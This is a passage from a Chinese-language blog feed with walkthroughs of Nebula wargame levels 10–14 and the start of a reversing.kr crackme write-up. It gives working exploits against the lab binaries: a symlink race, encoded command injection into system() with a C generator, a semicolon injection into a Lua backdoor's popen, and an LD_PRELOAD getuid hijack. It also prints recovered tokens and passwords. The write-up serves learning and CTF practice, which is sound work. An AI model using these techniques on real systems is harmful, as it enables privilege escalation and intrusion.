&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;退出后使用&lt;code&gt;python server.py&lt;/code&gt;让脚本跑起来。这里需要注意的是，对于软连接使用了&lt;code&gt;-f&lt;/code&gt;参数，这样可以强制覆盖已经存在的同名软连接文件。之后&lt;code&gt;Ctrl+Alt+F2&lt;/code&gt;切换到TTY2，在level10家目录下执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;touch fake_token
ln -s fake_token token
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样文件就伪造好了，然后执行flag10：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;/home/flag10/flag10 ~/token 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;完毕后&lt;code&gt;Ctrl+Alt+F1&lt;/code&gt;切回TTY1看结果，&lt;code&gt;615a2ce1-b2b5-4c76-8eed-8aa5c4015c27&lt;/code&gt;，用这个作为密码登陆flag10并getflag即可。&lt;/p&gt;
&lt;p&gt;这里需要留意的是，因为CPU的执行方式是时间片，因此每个进程只有在自己的CPU时间内才能执行相应的指令，也正是因为这个原因，指令的执行之间才有了等待，并有了其他程序执行的可能性。很可能当CPU执行速度过快的时候，你的py程序还没来得及修改软连接，flag10就已经执行到最后了，因此无法读取到正确的token。这时你可以多试验几次，或者想办法降低flag10的优先级（&lt;code&gt;nice&lt;/code&gt;可以修改进程优先级），提高py脚本的优先级，以确保py脚本可以替换掉软连接。&lt;/p&gt;
&lt;h1&gt;Nebula level11&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.&lt;/p&gt;
&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;p&gt;flag11会处理标准输入，同时执行一个shell命令。本关有两种方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();

  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
    'A' + (random() % 26), '0' + (random() % 10), 
    'a' + (random() % 26), 'A' + (random() % 26),
    '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));

  if(length &amp;lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
      err(1, &amp;quot;fread length&amp;quot;);
    }
    process(buf, length);
  } else {
    int blue = length;
    int pink;

    fd = getrand(&amp;amp;path);

    while(blue &amp;gt; 0) {
      printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf(&amp;quot;pink = %d\n&amp;quot;, pink);

      if(pink &amp;lt;= 0) {
        err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
    }  

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
      err(1, &amp;quot;mmap&amp;quot;);
    }
    process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这题是整个Nebula中最纠结的一题之一，最主要原因是因为代码和二进制程序不符……我查阅了Google中前几页基本所有的Nebula level11的解题思路，发现能作出结果的代码都是Nebula的新LiveCD之前的。所以这里，我们先回到原本的程序。先将上面的代码用root编译，命名成flag11_old，并修改文件权限、所有者、所有组等和flag11一致，然后开始下面的步骤。&lt;/p&gt;
&lt;p&gt;首先映入眼帘的是比前面一次更长的代码-_-||| 不过好在代码逻辑还是比较清晰的。这里既然要执行shell，就会定位到&lt;code&gt;system()&lt;/code&gt;，而这样就必须要调用&lt;code&gt;process()&lt;/code&gt;。可以看到调用发生在&lt;code&gt;main()&lt;/code&gt;的第三个if中。所谓的两种方法可能是指走不同的逻辑去执行&lt;code&gt;process()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;观察一下走if为true的这条线：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;if(length &amp;lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
        err(1, &amp;quot;fread length&amp;quot;);
    }
    process(buf, length);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一个条件&lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;很简单，可是，&lt;code&gt;fread()&lt;/code&gt;只会返回0或1，也就是说我们要执行的指令只能是1个字节的。但回车也会占用1个字节，我们可以做个试验：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1

sh: $'\v\020\367': command not found
level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1

sh: $'\vP\241': command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到，这样对于获取到了buf的内容完全是随机的。如果我们输入一个单字符命令，比如&lt;code&gt;X&lt;/code&gt;，根据&lt;code&gt;process()&lt;/code&gt;中的代码，命令&lt;code&gt;X&lt;/code&gt;会变为&lt;code&gt;Y&lt;/code&gt;，之后进入&lt;code&gt;system()&lt;/code&gt;执行。测试一下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/home/flag11$ ./flag11_old
Content-Length: 1
X
sh: $'Y\020\321': command not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到&lt;code&gt;X&lt;/code&gt;命令被当做&lt;code&gt;Y&lt;/code&gt;命令执行，但由于已经占用了一个字符，则没有办法输入回车。这里可以用一个拼运气的办法，不断测试，直到碰到内存中有0x0A（回车）从而获得运行：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level11@nebula:/tmp$ ln -s /bin/getflag Y
level11@nebula:/tmp$ export PATH=/tmp:$PATH
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\240S': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\340d': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
sh: $'Y\200b': command not found
level11@nebula:/tmp$ echo -ne &amp;quot;Content-Length: 1\nX&amp;quot; | /home/flag11/flag11_old
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;运气不错，没试几次就得到了结果:D&lt;/p&gt;
&lt;p&gt;第二种方法就是走if的另外一条路，那需要满足&lt;code&gt;length &amp;gt;= sizeof(buf)&lt;/code&gt;，也就是Length&amp;gt;=1024。可以先创建一个1024长度的空内容，之后把需要执行的命令填充进去：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char* argv[]) {
    int length = 1024;
    char buffer[1024] = {0};
    unsigned int key;
    int i;

    memcpy(buffer, &amp;quot;/bin/getflag&amp;quot;, 13);

    key = length &amp;amp; 0xff;
    for(i = 0; i &amp;lt; length; i++) {
        buffer[i] ^= key;
        key -= buffer[i] ^ key;
    }

    puts(&amp;quot;Content-Length: 1024&amp;quot;);
    fwrite(buffer, 1, length, stdout);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据&lt;code&gt;getrand()&lt;/code&gt;中的要求，设置一下环境变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;export TEMP=/tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;编译并执行程序：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;level11@nebula:~$ gcc -o exp11 exp11.c
level11@nebula:~$ ./exp11 | ~flag11/flag11_old
blue = 1024, length = 1024, pink = 1024
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样两种方法就实现了。&lt;/p&gt;
&lt;p&gt;最后说一说为什么新的文件不能成功运行程序。反汇编一下flag11：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;   0x080489c7 &amp;lt;+0&amp;gt;:     push   %ebp
   0x080489c8 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x080489ca &amp;lt;+3&amp;gt;:     sub    $0x28,%esp
   0x080489cd &amp;lt;+6&amp;gt;:     mov    0xc(%ebp),%eax
   0x080489d0 &amp;lt;+9&amp;gt;:     and    $0xff,%eax
   0x080489d5 &amp;lt;+14&amp;gt;:    mov    %eax,-0x10(%ebp)
   0x080489d8 &amp;lt;+17&amp;gt;:    movl   $0x0,-0xc(%ebp)
   0x080489df &amp;lt;+24&amp;gt;:    jmp    0x8048a0c &amp;lt;process+69&amp;gt;
   0x080489e1 &amp;lt;+26&amp;gt;:    mov    -0xc(%ebp),%eax
   0x080489e4 &amp;lt;+29&amp;gt;:    add    0x8(%ebp),%eax
   0x080489e7 &amp;lt;+32&amp;gt;:    mov    -0xc(%ebp),%edx
   0x080489ea &amp;lt;+35&amp;gt;:    add    0x8(%ebp),%edx
   0x080489ed &amp;lt;+38&amp;gt;:    movzbl (%edx),%edx
   0x080489f0 &amp;lt;+41&amp;gt;:    mov    %edx,%ecx
   0x080489f2 &amp;lt;+43&amp;gt;:    mov    -0x10(%ebp),%edx
   0x080489f5 &amp;lt;+46&amp;gt;:    xor    %ecx,%edx
   0x080489f7 &amp;lt;+48&amp;gt;:    mov    %dl,(%eax)
   0x080489f9 &amp;lt;+50&amp;gt;:    mov    -0xc(%ebp),%eax
   0x080489fc &amp;lt;+53&amp;gt;:    add    0x8(%ebp),%eax
   0x080489ff &amp;lt;+56&amp;gt;:    movzbl (%eax),%eax
   0x08048a02 &amp;lt;+59&amp;gt;:    movsbl %al,%eax
   0x08048a05 &amp;lt;+62&amp;gt;:    sub    %eax,-0x10(%ebp)
   0x08048a08 &amp;lt;+65&amp;gt;:    addl   $0x1,-0xc(%ebp)
   0x08048a0c &amp;lt;+69&amp;gt;:    mov    -0xc(%ebp),%eax
   0x08048a0f &amp;lt;+72&amp;gt;:    cmp    0xc(%ebp),%eax
   0x08048a12 &amp;lt;+75&amp;gt;:    jl     0x80489e1 &amp;lt;process+26&amp;gt;
   0x08048a14 &amp;lt;+77&amp;gt;:    call   0x8048700 &amp;lt;getgid@plt&amp;gt;
   0x08048a19 &amp;lt;+82&amp;gt;:    mov    %eax,(%esp)
   0x08048a1c &amp;lt;+85&amp;gt;:    call   0x8048690 &amp;lt;setgid@plt&amp;gt;
   0x08048a21 &amp;lt;+90&amp;gt;:    call   0x8048630 &amp;lt;getuid@plt&amp;gt;
   0x08048a26 &amp;lt;+95&amp;gt;:    mov    %eax,(%esp)
   0x08048a29 &amp;lt;+98&amp;gt;:    call   0x8048730 &amp;lt;setuid@plt&amp;gt;
   0x08048a2e &amp;lt;+103&amp;gt;:   mov    0x8(%ebp),%eax
   0x08048a31 &amp;lt;+106&amp;gt;:   mov    %eax,(%esp)
   0x08048a34 &amp;lt;+109&amp;gt;:   call   0x80486a0 &amp;lt;system@plt&amp;gt;
   0x08048a39 &amp;lt;+114&amp;gt;:   leave  
   0x08048a3a &amp;lt;+115&amp;gt;:   ret  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面是flag11中&lt;code&gt;process()&lt;/code&gt;完整的反汇编代码。可以看到0x08048a14开始有&lt;code&gt;setgid()&lt;/code&gt;和&lt;code&gt;setuid()&lt;/code&gt;的操作。这段反汇编如果翻译到C语言是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;void process(char *buffer, int length)
{
  ...

  setgid(getgid());
  setuid(getuid());

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;加入这两句之后，程序在执行&lt;code&gt;system()&lt;/code&gt;之前会强制还原uid和gid，因此程序本身的setuid权限失效，程序执行者永远是level11，而不是flag11，所以就不可能成功了。我这里也试验了用LD_PRELOAD的办法Hack掉&lt;code&gt;getuid()&lt;/code&gt;和&lt;code&gt;getpid()&lt;/code&gt;，但是很可惜方法无效，因为没有权限。&lt;/p&gt;
&lt;h1&gt;Nebula level12&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;p&gt;50001端口有个后门进程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="lua"&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password) 
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
    print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
    local h = hash(line)

    if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
      client:send(&amp;quot;Better luck next time\n&amp;quot;);
    else
      client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
    end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一段Lua脚本，逻辑简单清晰。脚本语言的好处就是你不懂语法，也能猜出个大概。&lt;/p&gt;
&lt;p&gt;这段脚本监听50001端口，并需要连接后提交密码。显然我们最关心的是能不能运行shell脚本，因此定位到&lt;code&gt;hash()&lt;/code&gt;中的&lt;code&gt;popen()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;直接截断看看可不可以：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level12@nebula:~$ nc 127.0.0.1 50001
Password: ;/bin/getflag &amp;gt; /tmp/flag12.txt
Better luck next time
level12@nebula:~$ cat /tmp/flag12.txt 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得来全不费工夫！&lt;/p&gt;
&lt;h1&gt;Nebula level13&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;p&gt;这是一个具有安全验证的程序，可以阻止非指定用户的执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
    printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
    printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
    exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;程序在运行时会检测用户的UID是否为1000（通过&lt;code&gt;cat /etc/passwd | grep 1000&lt;/code&gt;发现uid=1000的用户为nebula）。&lt;/p&gt;
&lt;p&gt;这里可以想办法通过干预getuid()的返回值来得到目的，因此可以采用GDB对返回值作出修改：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gdb ./flag13
...
(gdb) disas main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;反汇编main函数后发现：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;Dump of assembler code for function main:
...
   0x080484ef &amp;lt;+43&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
   0x080484f4 &amp;lt;+48&amp;gt;:    cmp    $0x3e8,%eax
...
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---q
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到，此处调用getuid()之后会把返回值放到eax中，因此只要在&lt;code&gt;0x080484f4&lt;/code&gt;处下断，让程序跑起来后修改eax为1000即可：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;(gdb) b *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) r
Starting program: /home/flag13/flag13 

Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) p $eax
$2 = 1000
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 15690) exited with code 063]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得到密码&lt;code&gt;b705702b-76a8-42b0-8844-3adabbe5ac58&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当然此题还有一种解法，就是劫持getuid()函数。&lt;/p&gt;
&lt;p&gt;首先通过&lt;code&gt;file&lt;/code&gt;发现flag13调用了共享库，接着创建一个C文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

uid_t getuid(void) {
    return 1000;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后编译并通过LD_PRELOAD环境变量替换掉真实的getuid()函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -o preload.so preload.c
export LD_PRELOAD=/home/level13/preload.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后通过strace来调用，即可观察到结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level13@nebula:~$ strace /home/flag13/flag13
...
write(1, &amp;quot;your token is b705702b-76a8-42b0&amp;quot;..., 51your token is b705702b-76a8-42b0-8844-3adabbe5ac58
) = 51
...
&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;Nebula level14&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;p&gt;程序加密了输入并写入标准输出，加密的token文件和程序都在flag14的家目录中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这题非常简单，破解加密算法，本来以为需要逆向，由于规律实在太简单，实验了几次就出来了：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level14@nebula:/home/flag14$ ./flag14
./flag14
    -e  Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
123456
13579;
level14@nebula:/home/flag14$ ./flag14 -e
654321
666666
level14@nebula:/home/flag14$ ./flag14 -e
11111111111111111111111111
123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJ$^C
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到，如果把输入数据看成一个数组，加密数据相当于输入数据加上数据的下标（从0开始），于是写出算法：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;plain = '123456'
encrypt = ''

for i in range(len(plain)):
    encrypt += chr(ord(plain[i:i+1]) + i)

print encrypt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;因此可以写出逆运算并把token文件给解密：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;token = open('/home/flag14/token')
encrypt = token.read()[:-1]
plain = ''

for i in range(len(encrypt)):
   plain += chr(ord(encrypt[i:i+1]) - i)

print plain
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后得到token：8457c118-887c-4e40-a5a6-33a25353165。&lt;/p&gt;</summary><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.kr四道Easy题解题攻略</title><link href="http://blog.yyx.name/posts/reversing-kr-4-easy-challenges.html" rel="alternate"></link><updated>2014-09-10T23:51:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-10:posts/reversing-kr-4-easy-challenges.html</id><summary type="html">&lt;h1&gt;开篇废话&lt;/h1&gt;
&lt;p&gt;Nebula的level11做的有点头大，这时大神Jack又发来了逆向的题目，让我赶紧练练。虽然我负责比赛中逆向类的题目，但逆向题一般都比较难，先放出来的题基本都是其他类别，所以我就彻底成了打（跑）辅（龙）助（套）的角色~~~&lt;/p&gt;
&lt;p&gt;这次这套题目来自&lt;a href="http://reversing.kr/"&gt;reversing.kr&lt;/a&gt;，棒子的逆向挑战网站。话说棒子的Hacking能力还是挺强的，据说是个什么棒子的优选计划搞出来的成果。&lt;/p&gt;
&lt;p&gt;本篇就记录一下4道名称是Easy开头题目，分别是Easy Crack、Easy Keygen、Easy Unpack和Easy ELF。这四题难度非常低，熟练地话掌握好节奏感可以蹭蹭蹭的秒题……&lt;/p&gt;
&lt;h1&gt;Easy Crack&lt;/h1&gt;
&lt;p&gt;程序启动后输入任意字符会显示一个MessageBox的Incorrect Password。打开OllyDbg，载入程序后查找到目标字符串Incorrect Password，之后转到程序，字符串前后代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401080  /$  83EC 64       sub esp,64
00401083  |.  57            push edi
00401084  |.  B9 18000000   mov ecx,18
00401089  |.  33C0          xor eax,eax
0040108B  |.  8D7C24 05     lea edi,dword ptr ss:[esp+5]
0040108F  |.  C64424 04 00  mov byte ptr ss:[esp+4],0
00401094  |.  6A 64         push 64                                  ; /Count = 64 (100.)
00401096  |.  F3:AB         rep stos dword ptr es:[edi]              ; |
00401098  |.  66:AB         stos word ptr es:[edi]                   ; |
0040109A  |.  AA            stos byte ptr es:[edi]                   ; |
0040109B  |.  8B7C24 70     mov edi,dword ptr ss:[esp+70]            ; |
0040109F  |.  8D4424 08     lea eax,dword ptr ss:[esp+8]             ; |
004010A3  |.  50            push eax                                 ; |Buffer
004010A4  |.  68 E8030000   push 3E8                                 ; |ControlID = 3E8 (1000.)
004010A9  |.  57            push edi                                 ; |hWnd
004010AA  |.  FF15 9C504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.GetDlgItemTe&amp;gt;; \GetDlgItemTextA

...

00401114  |.  6A 40         push 40                                  ; /Style = MB_OK|MB_ICONASTERISK|MB_APPLMODAL
00401116  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe
0040111B  |.  68 44604000   push Easy_Cra.00406044                   ; |Congratulation !!
00401120  |.  57            push edi                                 ; |hOwner
00401121  |.  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
00401127  |.  6A 00         push 0                                   ; /Result = 0
00401129  |.  57            push edi                                 ; |hWnd
0040112A  |.  FF15 A4504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.EndDialog&amp;gt;]  ; \EndDialog
00401130  |.  5F            pop edi
00401131  |.  83C4 64       add esp,64
00401134  |.  C3            retn
00401135  |&amp;gt;  6A 10         push 10                                  ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL
00401137  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe
0040113C  |.  68 30604000   push Easy_Cra.00406030                   ; |Incorrect Password
00401141  |.  57            push edi                                 ; |hOwner
00401142  |.  FF15 A0504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
00401148  |.  5F            pop edi
00401149  |.  83C4 64       add esp,64
0040114C  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;程序通过GetDlgItemTextA获取输入字符串，之后经过一段算法判定对错。下面分析算法：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010B0  |.  807C24 05 61  cmp byte ptr ss:[esp+5],61
004010B5  |.  75 7E         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先确定esp+5位置字符为0x61，即a。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010B7  |.  6A 02         push 2
004010B9  |.  8D4C24 0A     lea ecx,dword ptr ss:[esp+A]
004010BD  |.  68 78604000   push Easy_Cra.00406078                   ;  5y
004010C2  |.  51            push ecx
004010C3  |.  E8 88000000   call Easy_Cra.00401150                   ;  strcmp
004010C8  |.  83C4 0C       add esp,0C
004010CB  |.  85C0          test eax,eax
004010CD  |.  75 66         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后判断esp+A处字符串是否为5y。 这里由于&lt;code&gt;push 2&lt;/code&gt;指令，栈针会上移4byte，因此此时esp=esp-4，所以现在的esp+A相当于上一次的esp-4+A（esp+6），这样就和上一次esp+5成为连续的字符串，也就是3个连续的字符为a5y。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004010CF  |.  53            push ebx
004010D0  |.  56            push esi
004010D1  |.  BE 6C604000   mov esi,Easy_Cra.0040606C                ;  R3versing
004010D6  |.  8D4424 10     lea eax,dword ptr ss:[esp+10]
004010DA  |&amp;gt;  8A10          /mov dl,byte ptr ds:[eax]
004010DC  |.  8A1E          |mov bl,byte ptr ds:[esi]
004010DE  |.  8ACA          |mov cl,dl
004010E0  |.  3AD3          |cmp dl,bl
004010E2  |.  75 1E         |jnz short Easy_Cra.00401102
004010E4  |.  84C9          |test cl,cl
004010E6  |.  74 16         |je short Easy_Cra.004010FE
004010E8  |.  8A50 01       |mov dl,byte ptr ds:[eax+1]
004010EB  |.  8A5E 01       |mov bl,byte ptr ds:[esi+1]
004010EE  |.  8ACA          |mov cl,dl
004010F0  |.  3AD3          |cmp dl,bl
004010F2  |.  75 0E         |jnz short Easy_Cra.00401102
004010F4  |.  83C0 02       |add eax,2
004010F7  |.  83C6 02       |add esi,2
004010FA  |.  84C9          |test cl,cl
004010FC  |.^ 75 DC         \jnz short Easy_Cra.004010DA
004010FE  |&amp;gt;  33C0          xor eax,eax
00401100  |.  EB 05         jmp short Easy_Cra.00401107
00401102  |&amp;gt;  1BC0          sbb eax,eax
00401104  |.  83D8 FF       sbb eax,-1
00401107  |&amp;gt;  5E            pop esi
00401108  |.  5B            pop ebx
00401109  |.  85C0          test eax,eax
0040110B  |.  75 28         jnz short Easy_Cra.00401135
0040110D  |.  807C24 04 45  cmp byte ptr ss:[esp+4],45
00401112  |.  75 21         jnz short Easy_Cra.00401135
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后匹配字符串R3versing，并在字符串头部（esp+4处）添加字符为E。因此答案为Ea5yR3versing。&lt;/p&gt;
&lt;p&gt;这里算法由于涉及到esp的改变，因此OD跟踪起来比IDA静态分析更加简单。可以直接将程序跑起来，当程序碰到相关判断的地方（一般是cmp）会改变标志位（一般是ZF），只需要改变标志位寄存器的值让它按照你要的逻辑执行下去即可，当然你需要同时记录这些让逻辑保持正确的字符，你可以直接在栈（或数据区）中作出修改。之后当程序跑完之后，你的栈（或数据区）中就是一个正确的值。本程序栈的结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src="../statics/reversing-kr-4-easy-challenges/2014-09-13_234947.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;Easy Keygen&lt;/h1&gt;
&lt;p&gt;注册机题，readme要求Find the Name when the Serial is 5B134977135E7D13。程序跑起来，要求输入名字和序列号，测试了一下Name为abcde和随机的序列号，提示错误：&lt;/p&gt;
&lt;pre&gt;&lt;code class="dos"&gt;C:\Users\GreatYYX&amp;gt;&amp;quot;F:\Crack\reversingkr\Easy_KeygenMe\Easy Keygen.exe&amp;quot;

Input Name: abcde
Input Serial: 12345
Wrong
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;开OD跟着跑一下，下断点在InputName和InputSerial处，可以看到判定对错函数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401000  /$  81EC 30010000 sub esp,130
00401006  |.  55            push ebp
00401007  |.  56            push esi
00401008  |.  57            push edi
00401009  |.  B9 18000000   mov ecx,18
0040100E  |.  33C0          xor eax,eax
00401010  |.  8D7C24 11     lea edi,dword ptr ss:[esp+11]
00401014  |.  C64424 10 00  mov byte ptr ss:[esp+10],0
00401019  |.  C64424 74 00  mov byte ptr ss:[esp+74],0
0040101E  |.  F3:AB         rep stos dword ptr es:[edi]
00401020  |.  66:AB         stos word ptr es:[edi]
00401022  |.  AA            stos byte ptr es:[edi]
00401023  |.  B9 31000000   mov ecx,31
00401028  |.  33C0          xor eax,eax
0040102A  |.  8D7C24 75     lea edi,dword ptr ss:[esp+75]
